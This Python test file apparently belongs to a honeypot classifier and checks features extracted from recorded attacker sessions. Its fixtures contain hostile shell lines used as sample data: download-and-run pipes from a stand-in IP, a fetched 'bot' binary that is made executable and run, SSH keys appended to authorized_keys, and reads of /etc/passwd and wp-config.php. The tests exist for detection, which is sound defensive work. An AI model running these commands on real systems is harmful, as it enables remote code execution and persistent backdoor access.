import uuid

from classifier.features.session import extract_session_features
from classifier.schemas.session import SessionRecord


def create_session(
    commands,
    duration_seconds=10.0,
    end_reason="logout",
    decoy_files_surfaced=None,
):
    """Build a validated session with predictable timestamps for feature tests."""
    started_at = 100.0
    command_events = [
        {
            "cmd": command,
            "timestamp": started_at + offset,
        }
        for command, offset in commands
    ]

    return SessionRecord.model_validate({
        "schema_version": 1,
        "session_id": str(uuid.uuid4()),
        "protocol": "tcp_shell",
        "peer_ip": "127.0.0.1",
        "peer_port": 4444,
        "persona_id": "generic_linux",
        "started_at": started_at,
        "ended_at": started_at + duration_seconds,
        "duration_seconds": duration_seconds,
        "end_reason": end_reason,
        "command_count": len(command_events),
        "commands": command_events,
        "decoy_files_surfaced": decoy_files_surfaced or [],
    })


def test_extracts_timing_rate_and_repetition_features():
    """Timing and repetition measurements should be deterministic."""
    session = create_session([
        ("whoami", 1.0),
        ("ls", 3.0),
        ("ls", 6.0),
        ("exit", 10.0),
    ])

    features = extract_session_features(session)

    assert features.command_count == 4
    assert features.commands_per_minute == 24.0
    assert features.unique_command_count == 3
    assert features.repeated_command_count == 1
    assert features.inter_command_intervals_seconds == [2.0, 3.0, 4.0]
    assert features.average_inter_command_interval_seconds == 3.0


def test_extracts_discovery_and_file_read_features():
    """Discovery commands and sensitive file reads should remain separate facts."""
    session = create_session([
        ("hostname", 1.0),
        ("uname -a", 2.0),
        ("cat /etc/passwd", 3.0),
        ("cat /home/admin/readme.txt", 4.0),
        ("cat /var/www/html/wp-config.php", 5.0),
    ], decoy_files_surfaced=[
        "/etc/passwd",
        "/var/www/html/wp-config.php",
    ])

    features = extract_session_features(session)

    assert features.discovery_command_count == 2
    assert features.file_read_count == 3
    assert features.sensitive_file_read_count == 2
    assert features.decoy_files_surfaced_count == 2
    assert features.decoy_files_surfaced == [
        "/etc/passwd",
        "/var/www/html/wp-config.php",
    ]
    assert features.exit_command_present is False


def test_handles_empty_sessions_without_division_errors():
    """Disconnects without commands should still produce usable features."""
    session = create_session([], duration_seconds=0.0, end_reason="disconnect")

    features = extract_session_features(session)

    assert features.command_count == 0
    assert features.commands_per_minute == 0.0
    assert features.average_inter_command_interval_seconds is None
    assert features.command_names == []


def test_human_timing_score_reads_near_zero_at_bot_speed():
    """Commands 0.2s apart are well under the bot-speed floor -- the score
    should clamp to 0.0, not go negative."""
    session = create_session([
        ("whoami", 0.0),
        ("ls", 0.2),
        ("id", 0.4),
    ])

    features = extract_session_features(session)

    assert features.human_timing_score == 0.0


def test_human_timing_score_reads_near_one_at_human_pacing():
    """Commands 6s apart are well past the human-pacing ceiling -- the score
    should clamp to 1.0, not overshoot."""
    session = create_session([
        ("whoami", 0.0),
        ("ls", 6.0),
        ("id", 12.0),
    ], duration_seconds=12.0)

    features = extract_session_features(session)

    assert features.human_timing_score == 1.0


def test_human_timing_score_is_none_without_an_interval_to_measure():
    """A single command has no cadence at all -- that's a different fact
    than "scored as bot-speed", so it must read as None, not 0.0."""
    session = create_session([("whoami", 0.0)])

    features = extract_session_features(session)

    assert features.average_inter_command_interval_seconds is None
    assert features.human_timing_score is None


def test_zero_duration_burst_with_commands_reads_as_high_rate_not_idle():
    """Several commands landing on the same timestamp (duration_seconds == 0)
    is a maximally fast burst -- it must not be reported as a 0.0 rate, which
    would let it silently evade any commands_per_minute >= N rule."""
    session = create_session(
        [("whoami", 0.0), ("id", 0.0), ("uname -a", 0.0)],
        duration_seconds=0.0,
    )

    features = extract_session_features(session)

    assert features.command_count == 3
    assert features.commands_per_minute == 180.0


def create_http_session(commands, duration_seconds=10.0, end_reason="disconnect"):
    """Build a validated HTTP session with predictable timestamps."""
    started_at = 100.0
    command_events = [
        {"cmd": command, "timestamp": started_at + offset}
        for command, offset in commands
    ]
    return SessionRecord.model_validate({
        "schema_version": 1,
        "session_id": str(uuid.uuid4()),
        "protocol": "http",
        "peer_ip": "127.0.0.1",
        "peer_port": 4444,
        "persona_id": "ubuntu_web_server",
        "started_at": started_at,
        "ended_at": started_at + duration_seconds,
        "duration_seconds": duration_seconds,
        "end_reason": end_reason,
        "command_count": len(command_events),
        "commands": command_events,
        "decoy_files_surfaced": [],
    })


def create_telnet_session(commands, duration_seconds=10.0, end_reason="disconnect"):
    """Build a validated Telnet session with predictable timestamps."""
    started_at = 100.0
    command_events = [
        {"cmd": command, "timestamp": started_at + offset}
        for command, offset in commands
    ]
    return SessionRecord.model_validate({
        "schema_version": 1,
        "session_id": str(uuid.uuid4()),
        "protocol": "telnet",
        "peer_ip": "127.0.0.1",
        "peer_port": 4444,
        "persona_id": "busybox_router",
        "started_at": started_at,
        "ended_at": started_at + duration_seconds,
        "duration_seconds": duration_seconds,
        "end_reason": end_reason,
        "command_count": len(command_events),
        "commands": command_events,
        "decoy_files_surfaced": [],
    })


def test_ssh_login_password_pair_becomes_lowercased_credential():
    """The real SSH server logs "login:"/"password:" lines the same way
    Telnet does -- these should pair up identically."""
    session = create_session([("login: Root", 0.0), ("password: XC3511", 0.1)])

    features = extract_session_features(session)

    assert features.ssh_credentials_tried == ["root:xc3511"]


def test_ssh_username_without_password_produces_no_credential_pair():
    session = create_session([("login: root", 0.0)])

    features = extract_session_features(session)

    assert features.ssh_credentials_tried == []


def create_ftp_session(commands, duration_seconds=10.0, end_reason="disconnect"):
    """Build a validated FTP session with predictable timestamps."""
    started_at = 100.0
    command_events = [
        {"cmd": command, "timestamp": started_at + offset}
        for command, offset in commands
    ]
    return SessionRecord.model_validate({
        "schema_version": 1,
        "session_id": str(uuid.uuid4()),
        "protocol": "ftp",
        "peer_ip": "127.0.0.1",
        "peer_port": 4444,
        "persona_id": "generic_linux",
        "started_at": started_at,
        "ended_at": started_at + duration_seconds,
        "duration_seconds": duration_seconds,
        "end_reason": end_reason,
        "command_count": len(command_events),
        "commands": command_events,
        "decoy_files_surfaced": [],
    })


def test_ftp_user_pass_pair_becomes_lowercased_credential():
    """FtpHandler logs "USER x" / "PASS y" as separate commands -- these
    should pair up the same way Telnet's login/password lines do."""
    session = create_ftp_session([("USER Admin", 0.0), ("PASS Admin123", 0.1)])

    features = extract_session_features(session)

    assert features.ftp_credentials_tried == ["admin:admin123"]


def test_ftp_username_without_password_produces_no_credential_pair():
    """Client disconnects after USER, before sending PASS -- no pair to log."""
    session = create_ftp_session([("USER admin", 0.0)])

    features = extract_session_features(session)

    assert features.ftp_credentials_tried == []


def test_ftp_malformed_exchange_produces_no_credential_pair():
    """FtpHandler logs the raw line as-is when the client doesn't send a
    well-formed USER command first -- there's no real username to pair."""
    session = create_ftp_session([("HELP", 0.0), ("PASS toor", 0.1)])

    features = extract_session_features(session)

    assert features.ftp_credentials_tried == []


def test_telnet_login_password_pair_becomes_lowercased_credential():
    """A submitted Telnet login/password pair should surface as a matchable
    "user:pass" string, not just be counted -- rules that need to recognize
    a specific known wordlist (eg. Mirai defaults) have nothing to match
    against otherwise."""
    session = create_telnet_session(
        [("login: Root", 0.0), ("password: XC3511", 0.1)]
    )

    features = extract_session_features(session)

    assert features.telnet_credentials_tried == ["root:xc3511"]


def test_telnet_username_without_password_produces_no_credential_pair():
    """A username with no following password line (client disconnected
    mid-prompt) must not fabricate a pair."""
    session = create_telnet_session([("login: root", 0.0)])

    features = extract_session_features(session)

    assert features.telnet_credentials_tried == []


def test_non_telnet_session_never_populates_telnet_credentials_tried():
    """FTP logs a structurally similar USER/PASS exchange -- it must not be
    mistaken for a Telnet credential pair."""
    session = create_session([("login: root", 0.0), ("password: toor", 0.1)])

    features = extract_session_features(session)

    assert features.telnet_credentials_tried == []


def test_http_get_to_sensitive_path_counts_as_sensitive_file_read():
    """HttpHandler logs a full request line as one command -- the probed path
    (eg. /.env, /wp-config.php) previously had no way to reach the classifier
    at all, since only `cat <path>` incremented sensitive_file_read_count."""
    session = create_http_session([("GET /.env HTTP/1.1", 1.0)])

    features = extract_session_features(session)

    assert features.sensitive_file_read_count == 1


def test_http_get_to_ordinary_path_does_not_count_as_sensitive():
    session = create_http_session([("GET /index.html HTTP/1.1", 1.0)])

    features = extract_session_features(session)

    assert features.sensitive_file_read_count == 0


def test_shell_command_containing_get_does_not_trigger_http_sensitive_check():
    """The HTTP-path widening must not fire for a tcp_shell session that
    happens to contain the literal word "get" -- it's gated on protocol."""
    session = create_session([("get /.env", 1.0)])

    features = extract_session_features(session)

    assert features.sensitive_file_read_count == 0


def test_dotgithub_path_does_not_count_as_sensitive():
    """Bare substring matching on ".git" previously also matched ".github",
    an ordinary, non-sensitive directory name that merely shares a prefix."""
    session = create_http_session([("GET /.github/workflows/ci.yml HTTP/1.1", 1.0)])

    features = extract_session_features(session)

    assert features.sensitive_file_read_count == 0


def test_read_of_pluralized_marker_path_still_counts_as_sensitive():
    """A path extending a marker with a simple plural (eg. a "backups"
    directory) must still be flagged -- only unrelated-word extensions like
    ".git" -> ".github" should be excluded, not legitimate plurals."""
    session = create_session([("cat /srv/backups/customer_dump.sql", 1.0)])

    features = extract_session_features(session)

    assert features.sensitive_file_read_count == 1


def test_http_post_with_credential_fields_counts_as_auth_attempt():
    """A POST body to a fake login form (log=admin&pwd=hunter2) previously
    never incremented auth_attempt_count at all, unlike Telnet/FTP's
    USER/PASS exchange -- so authentication_attempt could never fire for
    HTTP credential harvesting."""
    session = create_http_session(
        [("POST /wp-login.php: log=admin&pwd=hunter2", 1.0)]
    )

    features = extract_session_features(session)

    assert features.auth_attempt_count == 1


def test_http_post_without_credential_fields_does_not_count_as_auth_attempt():
    session = create_http_session([("POST /api/contact: message=hello", 1.0)])

    features = extract_session_features(session)

    assert features.auth_attempt_count == 0


def test_http_post_with_catalog_field_does_not_count_as_auth_attempt():
    """Bare substring matching on "log=" previously also matched "catalog=",
    an ordinary product-search field that merely ends with those letters."""
    session = create_http_session([("POST /search: catalog=electronics&sort=price", 1.0)])

    features = extract_session_features(session)

    assert features.auth_attempt_count == 0


def test_http_post_with_wordpress_field_names_becomes_lowercased_credential():
    """WordPress's login form uses "log"/"pwd", not "username"/"password" --
    the pair should still surface as a matchable "user:pass" string."""
    session = create_http_session(
        [("POST /wp-login.php: log=Admin&pwd=Hunter2", 1.0)]
    )

    features = extract_session_features(session)

    assert features.http_credentials_tried == ["admin:hunter2"]


def test_http_post_with_generic_field_names_becomes_lowercased_credential():
    session = create_http_session(
        [("POST /login: username=Admin&password=Hunter2", 1.0)]
    )

    features = extract_session_features(session)

    assert features.http_credentials_tried == ["admin:hunter2"]


def test_http_post_with_only_username_field_produces_no_credential_pair():
    """A partial submission (eg. a form validation probe) must not fabricate
    a pair from a username with no matching password field."""
    session = create_http_session([("POST /login: username=admin", 1.0)])

    features = extract_session_features(session)

    assert features.http_credentials_tried == []


def test_http_post_without_credential_fields_produces_no_credential_pair():
    session = create_http_session([("POST /api/contact: message=hello", 1.0)])

    features = extract_session_features(session)

    assert features.http_credentials_tried == []


def test_http_request_paths_are_collected_in_order():
    """HttpHandler logs one request-line command per request -- the path
    should be exposed as its own feature, not just folded into a sensitive/
    not-sensitive boolean."""
    session = create_http_session([
        ("GET /wp-login.php HTTP/1.1", 1.0),
        ("GET /favicon.ico HTTP/1.1", 2.0),
    ])

    features = extract_session_features(session)

    assert features.http_paths_requested == ["/wp-login.php", "/favicon.ico"]


def test_non_http_session_never_populates_http_paths_requested():
    session = create_session([("get /.env", 1.0)])

    features = extract_session_features(session)

    assert features.http_paths_requested == []


def test_http_scanner_user_agent_is_logged_and_flagged():
    """HttpHandler logs a captured User-Agent header as its own command
    (eg. "User-Agent: masscan/1.3") -- a known scanner name in it should
    both surface in http_user_agents and flip the dedicated boolean rules
    match on, since the rule engine can't substring-match a raw header
    string against a wordlist itself."""
    session = create_http_session([("User-Agent: masscan/1.3", 1.0)])

    features = extract_session_features(session)

    assert features.http_user_agents == ["masscan/1.3"]
    assert features.http_known_scanner_user_agent is True


def test_http_ordinary_browser_user_agent_is_logged_but_not_flagged():
    session = create_http_session([
        ("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 1.0),
    ])

    features = extract_session_features(session)

    assert features.http_user_agents == ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
    assert features.http_known_scanner_user_agent is False


def test_non_http_session_never_populates_http_user_agents():
    session = create_session([("cat /etc/passwd", 1.0)])

    features = extract_session_features(session)

    assert features.http_user_agents == []
    assert features.http_known_scanner_user_agent is False


def test_download_piped_into_a_shell_is_flagged_as_fetch_and_run():
    session = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        ("uname -a; (wget -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s ssh", 1.0),
    ])

    features = extract_session_features(session)

    assert features.remote_fetch_and_run_attempt is True


def test_download_then_chmod_in_separate_commands_is_flagged_as_fetch_and_run():
    session = create_session([
        ("cd /tmp", 1.0),
        ("/usr/bin/wget http://203.0.113.9/bot", 2.0),
        ("chmod 777 bot", 3.0),
        ("./bot", 4.0),
    ])

    features = extract_session_features(session)

    assert features.remote_fetch_and_run_attempt is True


def test_download_without_a_run_step_is_not_flagged():
    session = create_session([("wget http://203.0.113.9/notes.txt", 1.0), ("chmod 400 notes.txt", 2.0)])

    features = extract_session_features(session)

    assert features.remote_fetch_and_run_attempt is False


def test_fetch_and_run_ignores_credential_lines_and_lookalike_names():
    """A password is attacker-chosen text, and "out_wget"/"mycurl" are
    filenames -- neither is a download tool being run."""
    session = create_session([
        ("login: root", 0.0),
        ("password: wget x | sh", 0.0),
        ("cat out_wget mycurl", 1.0),
        ("ps aux | shuf", 2.0),
    ])

    features = extract_session_features(session)

    assert features.remote_fetch_and_run_attempt is False


def test_key_appended_to_authorized_keys_is_flagged():
    session = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        (
            "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E example-key' >> /root/.ssh/authorized_keys "
            "&& chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys 2>/dev/null",
            2.0,
        ),
    ])

    features = extract_session_features(session)

    assert features.authorized_keys_write_attempt is True


def test_key_written_to_authorized_keys_with_tee_is_flagged():
    session = create_session([("echo ssh-ed25519 AAAAC3 example-key | tee -a ~/.ssh/authorized_keys", 1.0)])

    features = extract_session_features(session)

    assert features.authorized_keys_write_attempt is True


def test_reading_or_locking_authorized_keys_is_not_flagged():
    """Only a write counts. Reading the file, changing its mode, copying it
    elsewhere, or a password that happens to contain the text doesn't."""
    session = create_session([
        ("login: root", 0.0),
        ("password: x >> ~/.ssh/authorized_keys", 0.0),
        ("cat ~/.ssh/authorized_keys", 1.0),
        ("chmod 600 ~/.ssh/authorized_keys", 2.0),
        ("cat ~/.ssh/authorized_keys > /tmp/keys.txt", 3.0),
        ("echo hi > /tmp/authorized_keys.bak", 4.0),
    ])

    features = extract_session_features(session)

    assert features.authorized_keys_write_attempt is False


def test_printing_a_system_program_is_flagged():
    session = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        ("cat /bin/echo", 1.0),
    ])

    features = extract_session_features(session)

    assert features.system_binary_read_attempt is True


def test_printing_a_system_program_through_busybox_is_flagged():
    session = create_session([("/bin/busybox cat /usr/bin/id; uname -m", 1.0)])

    features = extract_session_features(session)

    assert features.system_binary_read_attempt is True


def test_reading_other_files_is_not_flagged_as_a_system_program_read():
    """Only cat on a file directly inside a system program directory counts.
    Ordinary files, a path that climbs back out, listing the directory, or
    a password that happens to contain the text doesn't."""
    session = create_session([
        ("login: root", 0.0),
        ("password: cat /bin/echo", 0.0),
        ("cat /etc/passwd", 1.0),
        ("cat /bin/../etc/passwd", 2.0),
        ("cat /tmp/bin/echo", 3.0),
        ("ls /bin/echo", 4.0),
        ("/bin/echo ok", 5.0),
    ])

    features = extract_session_features(session)

    assert features.system_binary_read_attempt is False


def test_login_followed_only_by_echo_checks_is_flagged():
    session = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        (r'echo -e "\x6F\x6B"', 1.0),
        ("echo OK", 1.5),
        ("exit", 2.0),
    ])

    features = extract_session_features(session)

    assert features.login_check_only is True


def test_echo_check_is_not_flagged_without_a_login_or_with_more_commands():
    """No login, a second real command, or an echo that writes a file or
    runs something else is not a bare login check."""
    no_login = create_session([("echo OK", 1.0)])
    more_commands = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        ("echo OK", 1.0),
        ("uname -a", 2.0),
    ])
    redirected = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        ("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", 1.0),
    ])
    chained = create_session([
        ("login: root", 0.0),
        ("password: admin", 0.0),
        ("echo OK; cat /proc/cpuinfo", 1.0),
    ])
    login_only = create_session([("login: root", 0.0), ("password: admin", 0.0)])

    for session in (no_login, more_commands, redirected, chained, login_only):
        assert extract_session_features(session).login_check_only is False


def test_handles_malformed_shell_input_as_observed_command():
    """Malformed input should remain measurable without crashing extraction."""
    session = create_session([
        ("cat 'unterminated", 1.0),
    ])

    features = extract_session_features(session)

    assert features.command_names == ["cat"]
    assert features.file_read_count == 1
